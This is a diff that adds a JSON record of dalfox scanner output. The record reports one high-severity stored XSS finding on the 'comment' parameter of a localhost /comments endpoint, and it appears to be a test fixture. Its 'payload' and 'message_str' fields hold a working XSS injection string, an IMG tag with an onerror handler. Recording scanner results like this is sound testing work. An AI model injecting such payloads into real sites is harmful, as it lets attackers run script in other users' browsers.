@@ -1,0 +1,42 @@
+{
+  "findings": [
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:<ephemeral-port>/comments",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param comment (DOM marker)",
+      "inject_type": "sxss-inHTML",
+      "location": "Body",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (DOM marker): comment='><IMG src=x onerror=alert(1) ClAss=dlx15ee421e>",
+      "method": "POST",
+      "param": "comment",
+      "payload": "'><IMG src=x onerror=alert(1) ClAss=dlx15ee421e>",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.2.4",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 1,
+    "incomplete": false,
+    "scan_duration_ms": 6968,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "status": "findings",
+        "target": "http://127.0.0.1:<ephemeral-port>/comments"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:<ephemeral-port>/comments"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 14
+  }
+}
